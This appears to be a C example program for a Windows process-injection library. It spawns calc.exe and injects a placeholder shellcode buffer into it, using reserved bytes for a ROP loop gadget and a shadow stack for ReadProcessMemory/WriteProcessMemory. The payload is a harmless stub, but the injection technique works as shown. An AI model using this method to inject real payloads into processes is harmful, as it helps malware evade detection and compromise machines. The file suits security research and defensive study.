#include <stdio.h>
#include <Windows.h>

#include "nina.h"

//
// Example shellcode:
// Make sure to have 8 reserved bytes for 64-bit
// jmp loop gadget to ROP into to stall execution.
// You will also need 40 reserved bytes for the 
// shadow stack used by ReadProcessMemory and 
// WriteProcessMemory.
//
BYTE Shellcode[] = {
    //
    // 8 bytes for RET gadget.
    //
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    //
    // Shadow stack.
    //
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    //
    // Actual shellcode starts here.
    //
    0xEB, 0xFE, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAA,
    0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};

int
main(
    _In_ int argc,
    _In_ char* argv[]
)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    BOOL ret;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    ZeroMemory(&pi, sizeof(pi));
    
    //
    // Do whatever you need to do here to get a target
    // process and thread handle.
    //
    ret = CreateProcessW(
        L"C:\\Windows\\System32\\calc.exe",
        //L"C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    );
    
    InjectPayload(
        pi.hProcess,
        pi.hThread,
        Shellcode,
        sizeof(Shellcode),
        TRUE
    );

    return 0;
}